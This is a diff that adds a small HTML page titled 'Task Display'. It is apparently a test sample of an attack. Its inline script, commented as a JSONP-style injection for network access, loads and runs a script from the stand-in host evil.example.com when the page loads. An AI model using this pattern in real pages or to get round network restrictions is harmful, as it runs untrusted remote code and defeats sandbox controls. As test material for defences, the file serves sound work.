@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Task Display</title>
+</head>
+<body>
+  <div id="root">Loading...</div>
+  <script>
+    // Attack: JSONP-style script injection for network access
+    function loadExternalData() {
+      const script = document.createElement('script');
+      script.src = 'https://evil.example.com/api?callback=handleData';
+      document.body.appendChild(script);
+    }
+    
+    function handleData(data) {
+      document.getElementById('root').textContent = JSON.stringify(data);
+    }
+    
+    loadExternalData();
+  </script>
+</body>
+</html>
